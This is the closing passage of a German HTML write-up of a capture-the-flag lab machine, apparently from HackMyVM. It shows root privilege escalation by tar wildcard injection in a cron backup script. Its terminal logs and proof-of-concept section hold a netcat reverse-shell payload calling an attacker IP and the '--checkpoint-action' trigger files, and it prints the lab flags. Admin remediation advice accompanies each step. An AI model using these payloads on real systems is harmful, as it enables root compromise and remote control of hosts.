+                <strong>Empfehlung (Pentester):</strong> Nutze die Wildcard-Injection aus. Erstelle die Dateien `--checkpoint=1` und `--checkpoint-action=exec=COMMAND` (wobei COMMAND z.B. eine Reverse Shell ist) im Verzeichnis `/var/www/html/`. Warte, bis der Cronjob (innerhalb einer Minute) `tar` ausführt und damit deinen Befehl als root triggert.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Korrigieren Sie das Backup-Skript dringend!** Ersetzen Sie den Wildcard (`*`) durch eine sicherere Methode, z.B. `tar czf /var/backups/backup-website.tar.gz .` (um das aktuelle Verzeichnis zu archivieren) oder `find . -maxdepth 1 -print0 | tar czf /var/backups/backup-website.tar.gz --null -T -`. Stellen Sie sicher, dass `www-data` keine unnötigen Schreibrechte in `/var/www/html/` hat.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/home$ <span class="command">cat /usr/local/bin/backup.sh</span>
+                     </div>
+                     <pre>
+ #!/bin/bash
+ cd /var/www/html/
+ tar czf /var/backups/backup-website.tar.gz *
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/home$ <span class="command">ls -la /usr/local/bin/backup.sh</span>
+                     </div>
+                     <pre>
+ -rwxr--r-- 1 root root 75 Feb 12 06:32 /usr/local/bin/backup.sh
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es werden verschiedene Versuche unternommen, die Wildcard-Injection auszunutzen.
+                1.  Versuch, das Skript direkt zu ändern (scheitert an Berechtigungen).
+                2.  Versuch, eine Datei mit einem En-Dash (`–`) statt zwei Hyphens (`--`) zu erstellen (Tippfehler, funktioniert nicht).
+                3.  Ein Skript `hacker.sh` mit einem Reverse-Shell-Payload wird erstellt.
+                4.  Die Trigger-Dateien für `tar` werden erstellt: `--checkpoint=1` und `--checkpoint-action=exec=sh hacker.sh`. `hacker.sh` wird ausführbar gemacht.
+                5.  Weitere Versuche mit Python werden vorbereitet (aber nicht benötigt).
+                6.  Der finale, erfolgreiche Befehl zum Erstellen der Action-Datei war `touch /var/www/html/--checkpoint-action=exec=sh\ hacker.sh` (der Backslash ist hier unnötig, aber schadet nicht).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nach einigen Versuchen gelingt es, die notwendigen Dateien (`--checkpoint=1`, `--checkpoint-action=exec=sh hacker.sh` und das ausführbare `hacker.sh`) im Web-Root zu platzieren. Nun muss nur noch auf die Ausführung des Cronjobs gewartet werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Starte einen Listener (`nc -lvnp 5552`, wie im Skript `hacker.sh` definiert) und warte maximal eine Minute auf die eingehende Root-Shell.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstelle im Cron-Skript. Entfernen Sie die bösartigen Dateien aus `/var/www/html/`. Überprüfen Sie das System auf Kompromittierung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/tmp$ <span class="command">echo 'nc -e /bin/bash 192.168.2.199 4444' >> /usr/local/bin/backup.sh</span>
+                     </div>
+                     <pre>
+ bash: /usr/local/bin/backup.sh: Permission denied
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/tmp$ <span class="command">touch '/var/www/html/–index-file=output.txt' # Tippfehler: – statt --</span>
+                     </div>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@quick4:/var/www/html$ <span class="command">vi hacker.sh</span>
+                    </div>
+                    <pre>
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 5552 >/tmp/f
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+www-data@quick4:/var/www/html$ <span class="command">touch /var/www/html/--checkpoint=1</span>
+                    </div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+ www-data@quick4:/var/www/html$ <span class="command">touch /var/www/html/--checkpoint-action=exec=sh\ hacker.sh</span>
+                    </div>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/var/www/html$ <span class="command">chmod +x hacker.sh</span>
+                     </div>
+                 </div>
+             </div>
+            <!-- Python-Versuche übersprungen, da nicht erfolgreich/relevant -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ www-data@quick4:/var/www/html$ <span class="command">ls -la</span>
+                     </div>
+                     <pre>
+ total 152
+ -rw-rw-rw-  1 www-data www-data     0 May 11 23:05 '--checkpoint-action=exec=hacker.sh'
+ -rw-rw-rw-  1 www-data www-data     0 May 11 23:09 '--checkpoint-action=exec=python3' <!-- Irrelevanter Versuch -->
+ -rw-rw-rw-  1 www-data www-data     0 May 11 23:12 '--checkpoint-action=exec=sh hacker.sh' <!-- Erfolgreicher Befehl, doppelter Eintrag? -->
+ -rw-rw-rw-  1 www-data www-data     0 May 11 23:04 '--checkpoint=1'
+ # ... (andere Dateien) ...
+ -rwxrwxrwx  1 www-data www-data    85 May 11 23:05 hacker.sh <!-- Ausführbar -->
+ # ...
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port 5552 gestartet. Kurz darauf wird eine Verbindung vom Zielsystem empfangen. Der `id`-Befehl in der neuen Shell bestätigt Root-Rechte. Anschließend wird ins `/root`-Verzeichnis gewechselt und die Root-Flag angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation via Cronjob-Wildcard-Injection erfolgreich!** Der Cronjob hat das `tar`-Kommando ausgeführt, welches durch die präparierten Dateien das Skript `hacker.sh` als root gestartet hat, was zur Reverse Shell führte. Die Root-Flag `<span class="password">HMV{858d77929683357d07237ef3e3604597}</span>` (eingebettet in ASCII-Art) wird erfolgreich gelesen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Maschine vollständig kompromittiert. Bericht abschließen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Sofort das Backup-Skript korrigieren (kein Wildcard)!** Bereinigen Sie die in `/var/www/html` erstellten Dateien. Überprüfen Sie das System auf Persistenzmechanismen oder andere Änderungen durch den Angreifer. Implementieren Sie sicherere Praktiken für Cronjobs.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 5552</span>
+                     </div>
+                     <pre>
+ listening on [any] 5552 ...
+ connect to [192.168.2.199] from (UNKNWN) [192.168.2.125] 52408
+ /bin/sh: 0: can't access tty; job control turned off
+ # <span class="command">id</span>
+ uid=0(root) gid=0(root) groups=0(root)
+ # <span class="command">cd /root</span> <!-- Korrigierter Befehl -->
+ # <span class="command">ls</span>
+ dash
+ root.txt
+ snap
+ # <span class="command">cat root.txt</span>
+
+                                             ██████    █████  █████ █████   █████████  █████   ████    █████ █████
+                                           ██████ ███  ███ ███   █████████   ███    ███ ███
+                                          ███    ███ ███   ███  ███  ███       ███  ███       ███  ███ █
+                                         ███     ███ ███   ███  ███ ███          ███████        ███████████
+                                         ███   █████ ███   ███  ███ ███          ██████       ████
+                                         ███ ████  ███   ███  ███ ███     ███ ███ ███            ███
+                                          ████████ ████████   █████ █████████  █████ ████          █████
+
+                                                                      %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
+                                                                  @@@:    .::.          :%@@@@@@@@@@@@@@@@@@@@@@@@@
+                                                                 @ @@                      :#@@@  @@@@@@@@@@@@@@@@@@
+                                                                 @                       @    %@  @% @@@@@@@@@@@@@@@@@
+                                                                @                         @     =   @ *@        @*@@@@@
+                                                               @             @@@@@@@@@@@@:      %     @ @        @.@@@@@
+                                                            - @                   :=%@@#      @       +@+@        @@@@@@@
+                                                           @ @                              =*=        @ @@ +#     @@@@@@@
+                                                         =@*-:      :@@          :#@@@@@@@#.            @@ @ @#    @*@@@@@@@@
+                                                =@@@@%:                                 :%@@@%      .%@@ : @@@      @@@@@@                 *@
+                         :@@@@@+             #%:                                             ...         =                  .                 @
+              =@@%              :@*                                        =@@@@*                                          @ @                  @
+     %@@  +@+@@        +@                                     *@@@@-                                     #                                       @
+@: .@ @-          @                                  :@@*     =@@                                                                    @@@@@        =
+@    @@@        @                                =%    @% @                                                                           @. @@@@       @
+*@. @@  @ @   *                                    = @.                                                                               @     @@@      @ @
+*@ @@@@@ @.  @                +             - :  @%  @                               :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%          =    .@@@@  @@@ @@@@@@
+ @@@@@  * @                =                @   @ @  @ @                     @@@@@@@@ @@@@@@@@@@@.@@@@@@@@@@@@@@@@@@@@@@@@@      @   @=#@*@@ @@@     @
+   *  @@@+                +@@ @            @ % % @=@  @ =                 *@@@@@@@@@@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=    %   @*@@ @@  @@@   %
+   .                                        @   @ @ @ @+-                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        %@@@@ @@  @ @ @
+   @@-# @   *@@@@@+       :@@@.              @@@@ @@@@*@                @@@@@      @@@@@@@@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+          @@=@ %@@  @
+@@@@@@@ *  @@@@@@@@@@@@@@@@@@@@=    .@+                                @@@@         %@@@@@@@@@@@@@@@@@@: @@@@@@@@@@@@@      @      @@:@@@@%= @@
+@*      @@@@@@@@@@ @.@@@@@@@@@@@@@@@@@@*      @@@*                     @@@@  @@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@     @         :@@@@@ @@@   @
+   %@@= %@@*:  @  @@ @ @@ @@ @@@@@@@@@@@@@@  @@-%@@@  @                @@@@%=@@@@@@@    @=@@@@@@@@@@@@@@@@@@                 @@ @@@@@@@@@    @@
+      @@@@:@=@@@@@@@%@:@=   =   @@@ @@@@@@ :@@ @@@@@@@@ :=             @@@@  @@@+ @@@   @@@@@@@@@@@                    @*         @@@@@*@@@@@
+      -+@@@ #@:@@@@   -@@ @@ @@-@@@ :*@            =@@@@@%@:=#@@@@=     @@@:@ @@@@=@@   @@@@@@@@                 @@
+          =@   @@ #@ @@  : @@@@@@@@ @@@@@@%      *%@*           -@:  @@@@@ @ .*@ @ #@   @@@@@@@@@         @%
+              @@@.-:   @@ %  @@@@@@@@@@@@@ . @@ @@@@@@@@@@@@@@@@@%   @@@@@ @@@@@ @ @@   @@     +@   @
+                  @         :=@@@+        @   :#@@@@@@@@ @.         @@@@@@ @   @+@=@@  -@@
+                    @@@@@@@@ @@@#:              @@@@@@@#           @@@+@@@ =@@@@  @@   @@
+                     =@@@@@@@@@@@@@@@-@@@@@@@.         :*%@@@@@@@@@@@@ @@@@ @@@=@ @    @@
+                         @@@@@@@@@                             @@@@@@@@@@@@  @@=@@    @@
+                                                                @@@@@@@ @@@@        =@@
+                                                                -@@@@@@@ @@@@@    #@@@
+                                                                  @@@@@@@ @@@@@@@@@@@
+                                                                       -@@@ @@@@@@
+
+                                                        <span class="password">HMV{858d77929683357d07237ef3e3604597}</span>
+ #
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc-privesc">
+             <h2>Proof of Concept (Privilege Escalation - Wildcard Injection)</h2>
+              <p class="analysis">
+                 <strong>Analyse:</strong> Dieser POC beschreibt die Ausnutzung der Tar-Wildcard-Injection-Schwachstelle im Cronjob zur Erlangung von Root-Rechten.
+             </p>
+              <p>
+                 <strong>Schwachstelle:</strong> Ein Cronjob führt minütlich als `root` das Skript `/usr/local/bin/backup.sh` aus. Dieses Skript verwendet `tar` mit einem Wildcard (`*`) im Verzeichnis `/var/www/html/`. Der Benutzer `www-data` hat Schreibrechte in `/var/www/html/`.
+             </p>
+             <p>
+                 <strong>Voraussetzungen:</strong> Shell-Zugriff als `www-data`. Schreibrechte im Verzeichnis `/var/www/html/`.
+             </p>
+             <p>
+                 <strong>Schritte zur Reproduktion:</strong>
+                 <ol>
+                     <li>Erstelle in der `www-data`-Shell ein Skript mit dem gewünschten Payload (z.B. Reverse Shell) in `/var/www/html/`: `echo '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP_Angreifer] [PORT] >/tmp/f' > /var/www/html/payload.sh`</li>
+                     <li>Mache das Payload-Skript ausführbar: `chmod +x /var/www/html/payload.sh`.</li>
+                     <li>Erstelle die Trigger-Dateien für `tar`:
+                         <ul>
+                             <li>`touch /var/www/html/--checkpoint=1`</li>
+                             <li>`touch /var/www/html/--checkpoint-action=exec=sh\ payload.sh`</li>
+                         </ul>
+                     </li>
+                     <li>Starte einen Netcat-Listener auf dem Angreifer-System auf dem im Payload definierten Port: `nc -lvnp [PORT]`.</li>
+                     <li>Warte maximal eine Minute, bis der Cronjob `/usr/local/bin/backup.sh` ausführt.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Erwartetes Ergebnis:</strong> Der `tar`-Befehl im Cronjob wird durch die `--checkpoint*`-Dateien angewiesen, das Skript `payload.sh` als `root` auszuführen. Dies führt zum Aufbau einer Reverse Shell zum Listener des Angreifers mit Root-Rechten.
+             </p>
+              <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong> Korrigieren Sie das Backup-Skript, indem Sie den Wildcard `*` entfernen und durch eine sichere Methode zum Auflisten von Dateien ersetzen (z.B. `.` oder `find`). Überprüfen Sie alle Cronjobs auf ähnliche Schwachstellen. Beschränken Sie Schreibrechte für den `www-data`-Benutzer.
+             </p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                    <!-- User-Flag wurde in /home/user.txt gefunden, nicht spezifisch für 'dev' -->
+                    <div class="flag-command">cat /home/user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{7920c4596aad1b9826721f4cf7ca3bf0}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{858d77929683357d07237ef3e3604597}</span></div>
+                </div>
+            </div>
+        </section>  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-05-11</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
